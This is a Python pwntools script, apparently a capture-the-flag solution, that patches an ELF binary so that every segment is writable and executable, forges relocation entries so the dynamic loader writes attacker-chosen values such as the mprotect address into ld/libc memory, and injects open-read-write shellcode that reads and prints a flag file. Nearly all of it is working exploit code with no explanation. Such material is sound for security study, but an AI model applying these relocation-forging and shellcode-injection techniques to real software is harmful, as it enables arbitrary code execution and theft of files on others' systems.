#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.

from elf import *
from pwn import *
import sys
const={
    "JUMP_SLOT":7,
    "COPY":5,
    "SYM":6,
    "FAIL":0x25,
}
code=Elf("./main")
for i in range(len(code.phdrs)):
    code.phdrs[i].p_flags=0x6
code.save("./main")

def rela(r_offset,type,symbol,r_addend):
    return p64(r_offset)+p32(const[type])+p32(symbol)+p64(r_addend)
def sym(name,info,shndx,value,size):
    return p32(name)+p8(info)+p8(shndx)+p16(value)+p64(size)

pool=[]
cnt=1
base_func="free"
def write(dis,value,libc_d=True):
    global pool
    global cnt
    dis-=libc.sym[base_func]
    if libc_d:
        value-=libc.sym[base_func]
    tmp1=rela(rela_base+0x18*cnt,"JUMP_SLOT",2,0xffffffffffffffff&dis)
    tmp2=rela(0xdeadbeef,"JUMP_SLOT",2 if libc_d else 0,0xffffffffffffffff&value)
    pool.append(tmp1)
    pool.append(tmp2)
    cnt+=2

libc_ld_dis=0x3f1000
libc=ELF("./lib/libc.so.6")
sym_idx=5
jmp_idx=10
rela_idx=9
elf=ELF("./main")
rela_base=elf.sections[rela_idx]['sh_addr']
pool=[]
write(0x228968+0xA8+libc_ld_dis,libc.sym["mprotect"])
write(0x228968+0xA0+libc_ld_dis,0x618000+0x100)
write(0x228968+0x70+libc_ld_dis,0x1000-3,libc_d=False)
write(0x228968+0x88+libc_ld_dis,0x7,libc_d=False)
write(0x228968+0x68+libc_ld_dis,0x400000,libc_d=False)
write(0x618000+0x100,0x4009e0,libc_d=False)
write(0x228f60+libc_ld_dis,libc.address+0x520A5)
write(0x229170+libc_ld_dis,0xc58a+libc_ld_dis)
write(0x228fc0+libc_ld_dis,0x10a02+libc_ld_dis)

tmp=rela(0xdeadbeef,"FAIL",0x2,0)
pool.append(tmp)

for i in range(len(pool)):
    elf.write(rela_base+0x18*i,pool[i])

shellcode="""
    mov rsi,0
    call here
    .ascii "/flag-e596f6971e03815673c4c28574fbebe2"
    .byte 0
    here:
    pop rdi
    mov rax,2
    syscall
    mov rdi,rax
    mov rax,0
    mov rsi,0x601000
    mov rdx,0x100
    syscall
    mov rdi,1
    mov rax,1
    syscall
"""
"""
shellcode=
    mov rsi,0
    call here
    .ascii "/"
    .byte 0
    here:
    pop rdi
    mov rax,2
    syscall
    mov rdi,rax
    mov rdx,0x1000
    mov rsi,0x601000
    mov rax,0x4e
    syscall
    mov rax,1
    mov rdi,1
    syscall
"""
orw=asm(shellcode,arch="amd64")
elf.write(0x4009e0,orw)
elf.save()
